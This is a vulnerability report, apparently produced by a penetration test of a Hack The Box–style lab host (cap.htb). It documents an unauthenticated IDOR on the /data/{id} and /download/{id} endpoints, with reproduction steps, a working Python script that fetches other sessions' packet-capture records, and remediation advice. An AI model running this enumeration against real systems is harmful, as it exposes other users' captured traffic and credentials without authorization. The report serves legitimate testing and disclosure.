# Unauthenticated IDOR in Capture Records Exposes PCAP Data via /data/{id} and /download/{id}

**ID:** vuln-0001
**Severity:** HIGH
**Found:** 2026-02-27 09:20:27 UTC
**Target:** http://cap.htb
**Endpoint:** /data/{id}, /download/{id}
**Method:** GET
**CWE:** CWE-639
**CVSS:** 7.5

## Description

A broken object-level authorization vulnerability was confirmed in the capture workflow of cap.htb. The application exposes capture records through predictable numeric identifiers and does not enforce authentication or ownership validation when retrieving those records. As a result, any user, including an unauthenticated external party, can access capture metadata and downloadable artifacts by modifying the object identifier in the URL.

The issue affects both record-view and file-download paths. Testing confirmed that capture IDs created in one browser session are accessible from a different session, and that direct unauthenticated requests to the same resources succeed with successful responses.

## Impact

The vulnerability allows unauthorized disclosure of packet capture data and associated metadata. Exposed captures can contain sensitive operational and credential material, creating a direct path to account compromise and privilege escalation. Because access is unauthenticated and identifiers are enumerable, exploitation is low-complexity and can be automated at scale.

Business impact includes confidentiality loss, increased risk of lateral movement, and potential full environment compromise if captured traffic contains authentication secrets or administrative credentials.

## Technical Analysis

The root cause is missing server-side authorization checks on object retrieval endpoints. The application uses sequential object references in URL paths and fails to bind requested objects to an authenticated principal or session context.

Validated behavior demonstrates broken access control:
Session A received a capture object at /data/5, while Session B received /data/2.
Session A successfully fetched Session B’s object at /data/2 with HTTP 200.
Session B successfully fetched Session A’s object at /data/5 with HTTP 200.
The corresponding download endpoints also returned HTTP 200 for cross-session access at /download/2 and /download/5.
Unauthenticated direct requests to /data/2, /data/5, /download/2, and /download/5 also returned HTTP 200.
Response body equivalence checks through content length and hash parity confirmed the same protected resources were returned across unauthorized contexts.

This is a classic IDOR/BOLA condition caused by trusting user-controlled object identifiers without mandatory access control enforcement.

## Proof of Concept

Reproduction steps:
1. Open browser Session A and visit /capture to generate a capture record. Note the redirected object ID, for example /data/5.
2. Open browser Session B (separate cookie jar) and visit /capture to generate another record. Note its ID, for example /data/2.
3. In Session A, request /data/2 and /download/2. Observe HTTP 200 and successful content retrieval for Session B’s object.
4. In Session B, request /data/5 and /download/5. Observe HTTP 200 and successful content retrieval for Session A’s object.
5. Without any authenticated session, request /data/2, /data/5, /download/2, and /download/5 directly. Observe HTTP 200 responses and accessible content.
6. Compare response lengths or hashes between authorized and unauthorized retrievals to confirm exposure of the same objects.

```
import hashlib
import re
import requests

BASE = "http://cap.htb"

def get_capture_id(session):
    r = session.get(f"{BASE}/capture", allow_redirects=False, timeout=10)
    loc = r.headers.get("Location", "")
    m = re.search(r"/data/(\\d+)", loc)
    if not m:
        raise RuntimeError(f"Could not parse capture ID from redirect: status={r.status_code}, location={loc}")
    return int(m.group(1))

def fetch(path, session=None):
    s = session or requests.Session()
    r = s.get(f"{BASE}{path}", timeout=10)
    digest = hashlib.sha256(r.content).hexdigest()
    return {
        "path": path,
        "status": r.status_code,
        "length": len(r.content),
        "sha256": digest[:16],
    }

def main():
    sess_a = requests.Session()
    sess_b = requests.Session()
    anon = requests.Session()

    id_a = get_capture_id(sess_a)
    id_b = get_capture_id(sess_b)

    print(f"Session A capture ID: {id_a}")
    print(f"Session B capture ID: {id_b}")

    tests = [
        ("A accesses B data", fetch(f"/data/{id_b}", sess_a)),
        ("B accesses A data", fetch(f"/data/{id_a}", sess_b)),
        ("A accesses B download", fetch(f"/download/{id_b}", sess_a)),
        ("B accesses A download", fetch(f"/download/{id_a}", sess_b)),
        ("Anon accesses A data", fetch(f"/data/{id_a}", anon)),
        ("Anon accesses B data", fetch(f"/data/{id_b}", anon)),
        ("Anon accesses A download", fetch(f"/download/{id_a}", anon)),
        ("Anon accesses B download", fetch(f"/download/{id_b}", anon)),
    ]

    print("\\nUnauthorized access checks:")
    for label, result in tests:
        print(f"{label}: status={result['status']} len={result['length']} sha256={result['sha256']}")

if __name__ == "__main__":
    main()
```

## Remediation

1. Require authentication on all capture-related endpoints, including /data/{id} and /download/{id}, with deny-by-default behavior for unauthenticated requests.
2. Enforce per-object authorization on every request by verifying that the requested capture record is owned by, or explicitly shared with, the current authenticated principal.
3. Replace sequential numeric identifiers with non-guessable opaque identifiers, but treat this only as defense-in-depth and not a substitute for authorization.
4. Add centralized authorization middleware to ensure consistent object-level enforcement across view and download routes.
5. Implement security regression tests for cross-session and unauthenticated access to capture resources, and block deployment on failed authorization tests.
6. Add monitoring and alerting for abnormal enumeration patterns targeting /data/* and /download/* identifiers.
